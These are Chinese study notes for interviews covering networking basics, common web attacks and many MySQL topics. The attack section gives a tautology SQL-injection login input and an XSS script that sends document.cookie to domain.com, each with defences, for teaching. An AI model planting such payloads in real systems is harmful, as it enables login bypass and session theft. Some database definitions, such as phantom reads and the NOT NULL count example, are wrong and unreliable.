**IP地址分类**

`ip 地址 ::={<网络号>,<主机号>}`

| IP 地址类别 | 网络号                                 | 网络范围               | 主机号 | IP 地址范围                  |
| ----------- | -------------------------------------- | ---------------------- | ------ | ---------------------------- |
| A 类        | 8bit，第一位固定为 0                   | 0 —— 127               | 24bit  | 1.0.0.0 —— 127.255.255.255   |
| B 类        | 16bit，前两位固定为 10                 | 128.0 —— 191.255       | 16bit  | 128.0.0.0 —— 191.255.255.255 |
| C 类        | 24bit，前三位固定为 110                | 192.0.0 —— 223.255.255 | 8bit   | 192.0.0.0 —— 223.255.255.255 |
| D 类        | 前四位固定为 1110，后面为多播地址      |                        |        |                              |
| E 类        | 前五位固定为 11110，后面保留为今后所用 |                        |        |                              |

![img](http://xyongs.cn/image/IP_address_6_12.png)

IP 地址的指派范围

![img](http://xyongs.cn/image/IP_address1_6_12.png)

特殊IP地址

![img](http://xyongs.cn/image/IP_address2_6_12.png)

### 🏷 数据链路层

数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。

在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装成帧，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。

在接收数据时，控制信息使接收端能够知道一个帧从哪个比特开始和到哪个比特结束。

### 🏷 提问

#### 搜索百度，会用到计算机网络中的什么层，什么协议？每次做些什么？

在浏览器中输入URL

浏览器将URL解析为IP地址 （**应用层的DNS协议**），首先主机会查询DNS缓存，如果没有就发送查询请求

> DNS两种查询方式：1. 递归查询； 2. 迭代查询

得到IP地址后，浏览器就要与服务器建立一个HTTP连接。因此要用到**HTTP协议**，HTTP生成一个get请求报文，

将该报文传递给**传输层处理，会用到TCP协议**。如果采用了HTTPS还需对数据进行加密。TCP层如果有需要先将HTTP数据包分片

TCP数据之后会发生给**网络层（IP协议）**。IP层通过路由选路，一跳一跳的发送到目的地址。期间可能需要使用**数据链路层的ARP、RARP协议**

### 🏷 攻击技术

#### SQL注入

SQL注入就是通过吗SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

SQL注入的总体思路：1. 寻找SQL注入位置；2. 判断服务器类型后后台数据库类型；3. 只对不同的服务器和数据库特点进行SQL注入攻击

##### 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```
strSQL = "SELECT * FROM users;"
```

##### 防范

* 参数绑定：采用占位符来代替字符串拼接
* 使用正则表达式过滤传入参数

#### XSS(跨站脚本攻击)

XXS是一种经常出现在web应用中的计算机安全漏洞，与SQL注入一起成为web中最主流的攻击方式

XSS是指恶意攻击者利用网站没有对用户提交数据进行转移处理获过滤不足的缺点，进而添加一些脚本代码嵌入到web页面中去，使别的用户访问都会执行响应嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或对访问者进行病毒侵害

##### 攻击原理

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

##### 危害：

* 盗取用户信息，账号
* 伪造虚假的输入表单骗取个人信息

##### 分类

1. 反射性XSS攻击（非持久性XSS攻击）

   > 如：发送消息正常`http://www.test.cn/message.php?send=hello`
   >
   > 非正常消息 `http://www.test.cn/message.php?send=<script>alert('foolish')</script>`

2. 持久性XXS攻击

##### 防范

* 将重要的cookie标记为http only，这样防止JavaScript中的document.cookie获取用户Cookie信息

* 过滤特殊字符，将`<`等字符转义

#### DDOS与DOS（拒绝服务攻击）

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

##### 防范

无法彻底根治

* 现在同时打开SYN半连接数目
* 缩短SYN半连接的Time out时间
* 关闭不必要的服务

上述三种方法，对真实用户不友好，可能会伤及无辜

目前主流应对策略

**设置高防服务器**

> 将域名托管至高防服务器，高防服务器直接硬刚黑客攻击，过滤攻击流量，将真正用户流量导给内容服务器
>
> 高防服务器主要通过定期扫描现有的网络节点、在骨干节点配置防火墙、查找可能存在的安全漏洞、用足够的机器承受黑客攻击、充分利用网络设备保护网络资源、过滤不必要的服务和端口等方式来防御DDoS攻击。要真正做好高防，仅靠硬防显然是不够的，实力强的机房都会在硬防上做策略以应对不同种类的攻击，如果防御策略不到位的话，攻击还是会导致服务器的带宽、CPU、内存使用率过高，进而直接影响到源站，造成服务中断等问题。

**高防CDN**

> CDN防御的全称是Content Delivery Network Defense，即内容分流网络流量防御。高防CDN的原理就是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，而不用直接访问网站源服务器。

参考 [防御DDOS攻击高防服务器和高防CDN哪个好？](https://cloud.tencent.com/developer/news/364713)

##### SYN泛洪攻击

攻击者完成TCP前两次握手后，不返回第三次握手ACK。

## 📚 MYSQL数据库

### 🏷 索引

数据库索引，是数据库管理系统中一个排序的数据结构，索引的实现通常使用的是B树或B+树。

在数据库之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构之上实现高级查找算法。这些数据结构就是索引。

**作用**：协助快速查询、更新数据库中数据

**缺点**：

1. 增加了数据的存储空间；
2. 在插入和修改数据时要花费较多的时间（因为索引也要随之改变）

**适合建立索引的字段：（唯一，不为空，经常被查询的字段）**

1、在经常需要搜索的列上，可以加快搜索的速度

2、在主键的列上，强制该列的唯一性和组织表中数据的排列结构；

3、在经常用在连接的列上，这些列主要是一些外键，可以加快连接的速度；

4、需要经常根据范围进行搜索的列上，因为索引已经排序，其指定范围是连续的

5、在经常需要排序的列上创建索引

6、经常使用where子句中

**不适合建立索引：**

1、查询中使用很少的

2、数据少的

3、text，image和bit要么数据大要么数据量小的

4、当修改性能远远大于检索性能，不应该创建索引。

**哪些情况下索引会失效？**[文](https://blog.csdn.net/JOJOY_tester/article/details/71104104)

1. 条件中用or，即使其中有条件带索引,也不会使用索引（这就是查询尽量不要用or的原因）

   > 使用or，又想索引生效，只能将or条件中的每一个列都加上索引

2. 对于多列索引，不是使用第一部分，则不会索引

3. like的模糊查询以%开头，索引失效

4. 如果列类型是字符串，那一定要在条件中将数据使用引号引用起来，否则不会使用索引。

5. 如果MySQL预计使用全表扫描要比使用索引快，则不使用索引。

**SQL语句优化**

怎样发现有问题的SQL语句？

MySQL的慢查询日志是MySQL提供的一种日志，它用来记录MySQL中响应时间超过阈值的语句，

1. 优化insert语句：一次性插入多值
2. 应尽量避免在where中使用`!=`或`<>`操作符，否则引擎将放弃使用索引而进行全表扫描；
3. 应尽量避免在where中使用对字段进行null判断，否则引擎将放弃使用索引而进行全表扫描；（在建表是定义字段为not null）
4. 优化嵌套查询：子查询可以被更有效率的连接（join）替代

------------------------------------

**❓MySQL B+ 树索引和Hash索引的区别？**

hash索引和B+树索引的特点：

1. Hash索引结构的特殊性，其检索效率非常高，索引的检索可以一次定位
2. B+树索引需要从根节点到枝叶节点，最后才能访问到叶节点，这样多次IO访问

区别：

1. Hash索引只能满足 "=" , "in" 查询，不能使用范围查询，因为经过相同的Hash算法处理后的Hash值的大小关系，并不能和hash算法运算前完全一致；
2. Hash索引无法被用来避免数据的排序操作，因为Hash值得大小关系并不一定和Hash运算前键值关系完成一样
3. Hash索引不能被利用部分索引间查询，
4. hash索引在任何时候都不能避免表扫描，由于不同索引键存在相同的Hash值，所以即使取某个Hash键值得数据的记录条数，也无法从Hash索引中直接完成查询，还是要回表查询数据

-----------------------

**❓B+树比B树更适合操作系统的文件索引和数据库索引？**

1、B+树的磁盘读写代价更低

> 文件与数据库是需要较大的存储，也就是说，它们都不可能全部存储在内存中，故而需要存储在磁盘上，则为了数据的快速定位与查找，那么索引的结构组织要尽量减少查找过程中的IO的次数，因此B+树比B树更适合。因为B树在非叶子节点中也存储了数据，需要中序遍历才能扫库，而B+树直接从叶子节点挨个扫描。
>
> B+树支持范围查找，而B树不支持，这是数据库选用B+树的主要原因了。

2、B+树的查询效率更加稳定

> B+树每次查询的耗时都相同，叶子节点有相同的深度。

聚集索引和非聚集索引的区别？

聚合索引：聚集索引表记录的排列顺序和索引的排列顺序一致，所以查询效率快，其余就连续性的记录在物理也一样连续存放。聚集索引对应的缺点就是修改慢，因为为了保证表中记录的物理和索引顺序一致，在记录插入的时候，会对数据页重新排序。

非聚合索引：

非聚合索引指定了表中记录的逻辑顺序，但是记录的物理和索引不一定一致，同时适用的情况就在于分组，大数目的不同值，频繁更新的列中，这些情况即不适合聚集索引。

两者都是采用B+树结构

**根本区别：**

聚集索引和非聚集索引的根本区别是表记录的排列顺序和与索引的排列顺序是否一致。

1、聚簇索引表记录的排列顺序和索引的排列顺序是一致的

2、聚簇索引一个表中只有一个，非聚簇可以有多个（200多个）

3、聚簇索引存储记录是物理上连续的存储，非聚集索引在逻辑上是连续的存在

**优点：**

聚簇：

1、以最快速度缩小查询范围

2、以最快的速度进行字段排序

使用场合：

1、此列包含的有限数目的不同值

2、查询的结果返回一个区间的值

3、查询的结果返回某值相同的大量结果集

非聚簇：

1、非聚簇索引比聚集索引层次多。

2、添加记录不会引起数据顺序的重组。

场合：

1、此列包含了大量数目不同的值

https://www.cnblogs.com/aspwebchh/p/6652855.html 参考

----------------------------------

聚集索引：通过主键将表的存储结构变成了树状机构，（整个表变成了一个索引）

一个表只能有一个主键，一个表只能有一个聚集索引

非聚集索引：（也就是我们平时经常提起和使用的常规索引）

每个（非聚类索引）之间不存在关联，索引树结构中各节点的值来自于表中的索引字段， 假如给user表的name字段加上索引 ， 那么索引就是由name字段中的值构成，在数据改变时， DBMS需要一直维护索引结构的正确性。

每次给字段建一个新索引， 字段中的数据就会被复制一份出来， 用于生成索引。 因此， 给表添加索引，会增加表的体积， 占用磁盘存储空间。

-------------

InNoDB（聚簇分布），利用主键将表存储为一个B+树的形式。二级索引存储的是关键字和主键

InNoDB按主键顺序插入行

若数据表中没有什么数据需要聚集，那么可以定义一个代理键作为主键，这种主键的数据和应用无关，最简单的方法就是自增列，这样可以保证数据行是按顺序输入

最好避免随机的聚簇索引，特别是对I/O密集型的应用，如使用UUID来作为聚簇索引：它使得索引的插入变得完全随机

UUID主键不仅插入行花费的时间更长，而且索引占用的空间更大。

----------------------------

**覆盖索引：**

**如果索引的叶子节点中已经包含了要查询的数据，那么还有什么必要在回表查询呢？**

**如果一个索引包含所有需要查询的字段的值，我们就称之为---覆盖索引**

**----查询只需要扫描索引而无需回表：**

**优点**：

1、减少数据访问量

2、减少IO

3、避免对主键的二次查询

### 🏷死锁

两个或多个事务在同一资源上相互占用，并请求对方占有的资源，从而导致恶性循环。

InNoDB目前处理死锁的方式是，将持有最少行级排他锁的事务回滚。

### 🏷 数据库范式

**1NF**

​    **每个关系r的属性值为不可分的原子值**

**2NF**

 **满足1NF，非主属性完全函数依赖于候选键(左部不可约)**

**3NF**

 **满足2NF，消除非主属性对候选键的传递依赖**

**BCNF**

  **满足3NF，消除每一属性对候选键的传递依赖**

### 🏷 数据库事务

事务具有 4 个特性：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和持续性（Durability）。这 4 个特性简称为 ACID 特性。

**1) 原子性**

事务必须是原子工作单元，事务中的操作要么全部执行，要么全都不执行，不能只完成部分操作。原子性在数据库系统中，由恢复机制来实现。

**2) 一致性**

事务开始之前，数据库处于一致性的状态；事务结束后，数据库必须仍处于一致性状态。数据库一致性的定义是由用户负责的。例如，在银行转账中，用户可以定义转账前后两个账户金额之和保持不变。

**3) 隔离性**

系统必须保证事务不受其他并发执行事务的影响，即当多个事务同时运行时，各事务之间相互隔离，不可互相干扰。事务查看数据时所处的状态，要么是另一个并发事务修改它之前的状态，要么是另一个并发事务修改它之后的状态，事务不会查看中间状态的数据。隔离性通过系统的并发控制机制实现。

**4) 持久性**

一个已完成的事务对数据所做的任何变动在系统中是永久有效的，即使该事务产生的修改不正确，错误也将一直保持。持久性通过恢复机制实现，发生故障时，可以通过日志等手段恢复数据库信息。

------------------

#### 事务并发问题

1、脏读：事务A读取了事务B更新的数据，然后B回滚操作，那么A读到的数据是脏数据

2、不可重复读：事务A多次读取同一数据，事务B在事务A多次读取的过程中，对数据进行了提交，导致数据A多次读取数据时前后数据结果不相同

3、幻读：事务A读取了事务B插入的数据，然后B回滚，A幻读。

**小结：不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表。**

#### 事务隔离级别

1. 读未提交（read-uncommitted)：可以读到未提交的内容

> 在这种隔离条件下，查询不会加锁，也由于查询的不加锁，所有这种隔离级别的一致性很差，会产生”脏读“、不可重复读，幻读--无特殊情况一般不会使用这种隔离方式

2. 读提交（read committed）：只能读到已提交的内容。

> 这是各种系统中最常用的一种隔离级别，也是SQL Server和Oracle的默认隔离级别
>
> 这种隔离级别能够有效的避免脏读，（不显示的在查询语句中加锁，普通的查询是不会加锁），利用的是”快照“机制
>
> 不能避免可重复读和幻读。

3. 可重复读：（Repeated Read)：针对”不可重复读“提出的解决方案（MySQL默认的隔离级别）

> 在这个级别下，普通的查询同样是使用的“快照读”，但是，和“读提交”不同的是，当事务启动时，就不允许进行“修改操作（Update）”了，而“不可重复读”恰恰是因为两次读取之间进行了数据的修改，因此，“可重复读”能够有效的避免“不可重复读”，**但却避免不了“幻读”，**因为幻读是由于“插入或者删除操作（Insert or Delete）”而产生的。
>
> 总结：可重复读：在当前事物中，如果不发生修改操作，则在该事物中前后读取到的数据应该是一致的，且不会读取到其他事物中提交或未提交的数据。

4. 串行化：(`Serializable`)

> 最高级别--这种级别下，事务”串行化顺序执行“，也就是一个一个排对执行
>
> 脏读，不可重复读，幻读都可以解决

#### 嵌套事务：

子事务嵌套在父事务中执行，子事务是父事务的一部分，在进入子事务前，父事务会建立一个回滚点。子事务会回滚到这个点

#### MySQL默认隔离级别

`MySQL`可重复读隔离级别的实现原理

https://www.cnblogs.com/lmj612/p/10598971.html

`MySQL`默认的隔离级别是可重复读，即：事务A在读到一条数据后，事务B对该数据进行了修改并提交，那么事务A再读该数据，读到的还是原来内容（如果不是则产生了不可重复读的问题）。

**实现方式：**使用一种`MVCC`（多版本并发控制，类似一种乐观锁）

1、 在读取事务开始时，系统会给当前读事务一个版本号，事务会读取版本号`<=`当前版本的数据

2、如果其他写事务修改了这条数据，那么这条数据的版本号就会加1，从而比当前读事务的版本号高，读事务就读不到更新后的数据

#### MVCC多版本并发控制

MVCC的实现，是通过保存数据在某个时间点的快照来实现的。也就是说，不管需要执行多长时间，每个事务看到的数据是一致的。

https://techlog.cn/article/list/10183404

#### **MySQL 是如何解决幻读的**

**1. 多版本并发控制（MVCC）（快照读/一致性读）**

**2. next-key 锁 （当前读）**

next-key 锁包含两部分：

-  记录锁（行锁）
-  间隙锁

记录锁是加在索引上的锁，间隙锁是加在索引之间的。（思考：如果列上没有索引会发生什么？）

原理：将当前数据行与上一条数据和下一条数据之间的间隙锁定，保证此范围内读取的数据是一致的。

### 🏷 视图和游标

视图：

是一种虚拟的表，通常是有一个表或者多个表的行或列的子集，具有和物理表相同的功能，可以对视图更新；（但无论该视图依赖于几个基本表，对视图中的数据进行修改，一次只能变动一个基本表中的数据。当对视图中的多个数据进行修改时，必须保证每一个被修改的数据都基于一个基本表。如果在视图中对多个数据进行修改，而这些被修改的数据基于多个基本表，那么这些修改无效。

游标：

是对查询出来的结构集作为一个单元来有效的处理。游标可以定在该单元中特定的行，从结果集的当前行检索一行或多行。可以对结果集当前进行修改。一般不使用游标，但是需要逐条处理数据的时候，游标显得十分重要。

### 🏷 触发器

触发器是与表相关的数据库对象，在满足定义条件时触发，并执行触发器定义的语句集合。触发器的这种特性可以协助应用在数据库端确保数据库的完整性。

### 🏷mysql的limit用法、逻辑分页和物理分页

另：删除有逻辑删除与物理删除

https://blog.csdn.net/lvoelife/article/details/81943070

| 物理分页                                                     | 逻辑分页                                                     | cool       |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------- |
| 物理分页依赖的是某一物理实体，这个物理实体就是数据库，比如MYSQL数据库提供了关键字limit，返回的是分页结果 | 逻辑分页依赖的是程序员编写代码，数据库返回的不是分页结果，而是全部数据，然后在由程序员通过代码获取分页数据，常用的操作是一次性从数据库中查询出全部数据并存储在list集合中，因为list集合有序，在根据索引获取指定范围的数据 | 概念       |
| 每次都要访问数据库，对数据库造成的负担大                     | 只需访问一次数据库                                           | 数据库负担 |
| 每次只读取一部分数据，占用的内存空间较小                     | 一次性将数据读取到内存中，占用较大的内存空间。               | 服务器负担 |
| 每次需要时都要访问数据库，能够获取数据库的最新状态，实时性强 | 因为一次性读入到内存，数据发生了改变，数据的最新状态无法实时反映到操作中 | 实时性     |
| 数据库量大、更新频繁的场合                                   | 数据量较小，数据稳定的场合                                   | 使用场合   |

### 🏷 Innodb引擎和Myisam引擎

摘自[《深入理解 Mysql 索引底层原理》](https://zhuanlan.zhihu.com/p/113917726)

`Mysql`底层数据引擎以插件的形式设计的，最常见的是`Innodb`引擎和`Myisam`引擎，用户可以根据个人需求选择不同的引擎作为`MySQL`数据表的底层引擎。

`Myisam`虽然查找性能极佳，但是不支持事务处理。`InNoDB`最大的特色就是支持了`ACID`兼容的事务功能，而且他也支持行级锁。`MySQL`建立表的时候就可指定引擎，比如：

```sql
create table `user2` (
	`id` int(11) not null default `0`,
	`username` varchar(255) not null,
	primary key (`id`)
) ENGINE=myisam default charset = utf8;
create table `user` (
	`id` int(11) not null default `0`,
	`username` varchar(255) not null,
	primary key (`id`)
) ENGINE=InnoDB default charset = utf8; 
```

执行上述两个指令后，系统出现了以下文件，说明这两个引擎数据和索引的组织方式是不一样的。

![img](http://www.xyongs.cn/image/mysql_engine.png)

Innodb创建表后生成的文件有：

* frm: 创建表的语句
* idb：表里的数据+索引文件

Myisam创建后生成的文件有：

* frm：创建表的语句
* MYD：表里的数据文件（`myisam data`）
* MYI：表里的索引文件（`myisam index`）

从生成的文件上来看，这两个引擎底层数据和索引的组织方式并不一样，`MyISAM`引擎把数据和索引存在不同的文件，这叫做非聚集索引方式；`InNoDB`引擎把数据和引擎放在同一个文件里，这叫聚簇索引方式。下面将从底层实现角度分析这两个引擎是怎么依靠`B+`树这个数据结构来组织引擎实现的。

#### MyISAM引擎的底层实现（非聚集索引方式）

MyISAM用的是非聚类索引方式，即数据和索引落在不同的两个文件上。MyISAM在建表时以主键作为key来建立主索引的B+树，树的叶子节点存储的是对应数据的物理地址。我们拿到这个物理地址就可以到MyISAM数据文件中直接定位到具体的数据记录了。

![img](http://www.xyongs.cn/image/mysql_myisam.png)

当我们为某个字段添加索引时，我们同样会生成对应字段的索引树，该字段的索引树的子节点同样记录的了对应数据的物理地址，然后也是拿着物理地址去数据文件中定位到具体的位置。

#### `InNoDB`引擎的底层实现（聚集索引方式）

`InNoDB`是聚集索引方式，因此数据和索引都存储在同一个文件中。首先`InNoDB`会根据主键`ID`作为`KEY`建立索引`B+`树，而`B+`树的叶子节点存储的是主键`ID`对应的数据，比如在执行 `slect * from user_info where id = 5;` 这个语句式，`InNoDB`就会查询这棵主键`ID`索引`B+`树，找到对应的`user_name`。

这是建表的时候`InNoDB`就会自动建立好主键`ID`索引树，这也是为什么`MySQL`在建表时要求必须指定主键的原因，当我们给`user_name`这个字段加索引，那么`InNoDB`就会建立`user_name`索引`B+`树，节点里存储的是`user_name` 的 `KEY`，叶子节点存储的是主键KEY，拿到主键后，`InNoDB`才会去主键索引树中二次索引，找对对应的数据

![img](http://www.xyongs.cn/image/mysql_innodb.png)

**❓为什么`InNoDB`只在主键索引树的叶子节点存储了具体的数据，在其他索引树却不存在具体数据，而要多此一举先找到主键，再在主键索引树中找到对应数据？**

`InNoDB`需要节省存储空间。一个表里可能有很多个索引

#### 对比

`MyISAM`查询性能更好，从索引文件数据的设计可以看出：`MyISAM`直接找到物理地址，但是`InNoDB`查询到叶子节点后，还需要再次查询主键索引树。

#### ❓添加索引的时机？

1. 较频繁的作为查询条件的字段应该穿件索引；
2. 唯一性太差的字段不适合单独创建索引，即使该字段频繁作为查询条件；
3. 更新非常频繁的字段不适合创建索引。

### 🏷 数据库锁

`MySQL`三种锁：

表级锁

行级锁

页级锁

**死锁：只多个进程在执行过程中，因争夺资源而造成的一种等待现象，若无外力干预，他们无法进行下去**

**悲观锁：**

顾名思义，就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿到这个数据就会block直到它拿到锁。

传统的关系型数据库里边用到了很多这样的锁，行锁，表锁，读锁，写锁，都是在操作前先上锁的。

**乐观锁：**

每次去拿数据的时候都认为别人不会修改，所以不会上锁，但在更新的时候会判断在此期间别人有没有去更新这个数据，可以使用版本号等机制。

乐观锁适用于多读的场景，这样可以提高吞吐量

两种锁各有优缺点，不可认为一种好于另一种，像乐观锁适用于写比较少的情况下，即冲突真的很少发生的时候，这样可以省去了锁的开销，加大了系统的整个吞吐量。但如果经常产生冲突，上层应用会不断的进行`retry`，这样反倒是降低了性能，所以这种情况下用悲观锁就比较合适。

### 🏷 MySQL join原理

[MySQL Join算法与调优白皮书（一）](https://mp.weixin.qq.com/s/AwhFsjUcoIA8zfqR5TmrHg)

两张表join的过程：

![img](http://www.xyongs.cn/image/join_7-12.png)

MySQL是只支持一种join算法的Nested-Loop Join（嵌套循环连接），变种：

（1）Simple Nested-Loop join

![img](http://www.xyongs.cn/image/join_1-7-12.png)

从驱动表（r)中取出R1匹配S表中所有列，然后R2,R3,直到将R表中数据匹配完，然后合并数据。

缺点开销太大

（2）Index Nested-Loop Join

索引嵌套连接是由于非驱动表上有索引，通过索引加速查询。这也是在做关联查询的时候必须要求关联字段有索引的一个主要原因。

![img](http://xyongs.cn/image/join_2-7-12.png)

(3)Block Nested-Loop Join

比simple Nested-Loop join多了一个join buffer， 使用join buffer将驱动表中的查询join相关的列缓冲到join buffer中，然后批量与非驱动表进行比较，这样来实现的话，可以将多次比较合并为一次，降低了非驱动的访问频率。也就是只需要访问一次S表。

MySQL中可以设置join_buffer_size 默认是256K

![img](http://www.xyongs.cn/image/join_3-7-12.png)

##### mysql 语句执行顺序

https://www.cnblogs.com/163yun/p/9448205.html

- (1) `from`：对左表`left-table`和右表`right-table`执行笛卡尔积(a*b)，形成虚拟表VT1;
- (2) `on`: 对虚拟表VT1进行`on`条件进行筛选，只有符合条件的记录才会插入到虚拟表VT2中;
- (3) `join`: 指定`out join`会将未匹配行添加到VT2产生VT3,若有多张表，则会重复(1)~(3);
- (4) `where`: 对VT3进行条件过滤，形成VT4, `where`条件是从左向右执行的;
- (5) `group by`: 对VT4进行分组操作得到VT5;
- (6) `cube | rollup`: 对VT5进行`cube | rollup`操作得到VT6;
- (7) `having`: 对VT6进行过滤得到VT7;
- (8) `select`: 执行选择操作得到VT8，本人看来VT7和VT8应该是一样的;
- (9) `distinct`: 对VT8进行去重，得到VT9;
- (10) `order by`: 对VT9进行排序，得到VT10;
- (11) `limit`: 对记录进行截取，得到VT11返回给用户。

Note: `on`条件应用于连表过滤，`where`应用于on过滤后的结果（有`on`的话），`having`应用于分组过滤

### 🏷 数据库Q&A

**问题1、为什么一定要设置一个主键？**

**A：**在你不设置主键的情况下，`innodb`也会帮你生成一个隐藏列，作为自增主键。并且在自建主键上能显式的用上主键索引，提高查询效率；

**问题2、主键用自增还是UUID？**

**A：**自增较好，`innodb`中的主键值聚簇索引，如果主键是自增的，那么每次插入新的记录，记录就会顺序添加到当前索引节点的后续位置，当一页写满，就会自动开辟一个新的页。如果不是自增主键，那么可能会在中间插入，引发页的分裂，产生表碎片

2.1、自增主键用完怎么办？

A:增大数据范围，如`int` 改为`BigInt` 

**问题3:主键为什么不推荐有业务含义?**

*回答*:有如下两个原因

- (1)因为任何有业务含义的列都有改变的可能性,主键一旦带上了业务含义，那么主键就有可能发生变更。主键一旦发生变更，该数据在磁盘上的存储位置就会发生变更，有可能会引发页分裂，产生空间碎片。
- (2)带有业务含义的主键，不一定是顺序自增的。那么就会导致数据的插入顺序，并不能保证后面插入数据的主键一定比前面的数据大。如果出现了，后面插入数据的主键比前面的小，就有可能引发页分裂，产生空间碎片。

**问题4:表示枚举的字段为什么不用enum类型？**

回答:在工作中表示枚举的字段，一般用tinyint类型。

那为什么不用`enum`类型呢？下面两个原因

(1)`ENUM`类型的`ORDER BY`操作效率低，需要额外操作

(2)如果枚举值是数值，有陷阱

问**题5:货币字段用什么类型?**

*回答:*如果货币单位是分，可以用Int类型。如果坚持用元，用Decimal。

千万不要答`float`和`double`，因为`float`和`double`是以二进制存储的，所以有一定的误差。

**问题6:时间字段用什么类型?**

*回答:*此题无固定答案，应结合自己项目背景来答！把理由讲清楚就行！

1. `varchar`，如果用`varchar`类型来存时间，优点在于显示直观。但是坑的地方也是挺多的。比如，插入的数据没有校验，你可能某天就发现一条数据为2013111的数据，请问这是代表2013年1月11日，还是2013年11月1日？其次，做时间比较运算，你需要用`STR_TO_DATE`等函数将其转化为时间类型，你会发现这么写是无法命中索引的。数据量一大，是个坑！
2. `timestamp`，该类型是四个字节的整数，它能表示的时间范围为`1970-01-01 08:00:01`到`2038-01-19 11:14:07`。2038年以后的时间，是无法用`timestamp`类型存储的。但是它有一个优势，`timestamp`类型是带有时区信息的。一旦你系统中的时区发生改变，例如你修改了时区
3. `datetime`，`datetime`储存占用8个字节，它存储的时间范围为`1000-01-01 00:00:00 ~ 9999-12-31 23:59:59`。显然，存储时间范围更大。但是它坑的地方在于，他存储的是时间绝对值，不带有时区信息。如果你改变数据库的时区，该项的值不会自己发生变更！
4. `bigint`，也是8个字节，自己维护一个时间戳，表示范围比`timestamp`大多了，就是要自己维护，不大方便。

**问题7:为什么不直接存储图片、音频、视频等大容量内容?**

*回答:*我们在实际应用中，都是用`HDFS`来存储文件。然后`mysql`中，只存文件的存放路径。`mysql`中有两个字段类型被用来设计存放大容量文件，也就是`text`和`blob`类型。但是，我们在生产中，基本不用这两个类型！

主要原因有如下两点

- (1)`Mysql`内存临时表不支持`TEXT`、`BLOB`这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。导致查询效率缓慢
- (2)`binlog`内容太多。因为你数据内容比较大，就会造成`binlog`内容比较多。大家也知道，主从同步是靠binlog进行同步，`binlog`太大了，就会导致主从同步效率问题！

因此，不推荐使用`text`和`blob`类型！

**问题8:字段为什么要定义为NOT NULL?**

*回答:*OK，这问题从两个角度来答

(1)索引性能不好

**Mysql难以优化引用可空列查询，它会使索引、索引统计和值更加复杂。可空列需要更多的存储空间，还需要mysql内部进行特殊处理。可空列被索引后，每条记录都需要一个额外的字节，还能导致`MYisam` 中固定大小的索引变成可变大小的索引。**

**—— 出自《高性能mysql第二版》**

(2)查询会出现一些不可预料的结果

这里举一个例子，大家就懂了。假设，表结构如下

`create table table_2 (id INT (11) NOT NULL,    name varchar(20) NOT NULL )`

表数据是这样的

| id   | name     |
| ---- | -------- |
| 1    | Sanzhang |
| 3    |          |
| 5    | Sili     |
| 7    |          |

你执行语句

`select count(name) from table_2;`

你会发现结果为2，但是实际上是有四条数据的！类似的查询问题，其实有很多，不一一列举。

记住，因为`null`列的存在，会出现很多出人意料的结果，从而浪费开发时间去排查`Bug`.

**面试题001：请解释关系型数据库概念及主要特点？**

关系型数据库模型是**把复杂的数据结构归结为简单的二元关系**，对数据的操作都是建立一个或多个关系表格上，**最大的特点就是二维的表格**，通过`SQL`结构查询语句存取数据，保持数据一致性方面很强大

**面试题002：请说出关系型数据库的典型产品、特点及应用场景？**

1、`SQLserver`：主机为`Windows`系统很好的适配`Windows`操作系统，主要应用于`web`网站的建设，承载中小型`web`后台数据

2、`MySQL`：高并发读写需求，网站的用户并发非常高，硬盘`I/O`是一个很大的瓶颈；

3、`Oracle`，夸平台，安全性能高，性能稳定，对硬件要求高，贵

**面试题003：请解释非关系型数据库概念及主要特点？**

非关系型数据库也被称为`NoSQL`数据库，数据存储不需有特有固定的表结构 特点：高性能、高并发、简单易安装

**面试题006：请详细描述`char(4)`和`varchar(4)`的差别**

`char`长度是固定不可变的，`varchar`长度是可变的（在设定内）比如同样写入`cn`字符，`char`类型对应的长度是`4(cn+两个空格)`,但`varchar`类型对应长度是2

**面试题009：什么是`MySQL`多实例，如何配置`MySQL`多实例？**

`mysql`多实例就是在同一台服务器上启用多个`mysql`服务，它们监听不同的端口，运行多个服务进程，它们相互独立，互不影响的对外提供服务，便于节约服务器资源与后期架构扩展 多实例的配置方法有两种： 1、一个实例一个配置文件，不同端口 2、同一配置文件(`my.cnf`)下配置不同实例，基于`mysqld_multi`工具

**面试题010：如何加强`MySQL`安全，请给出可行的具体措施？**

1、删除数据库不使用的默认用户 2、配置相应的权限（包括远程连接） 3、不可在命令行界面下输入数据库的密码 4、定期修改密码与加强密码的复杂度

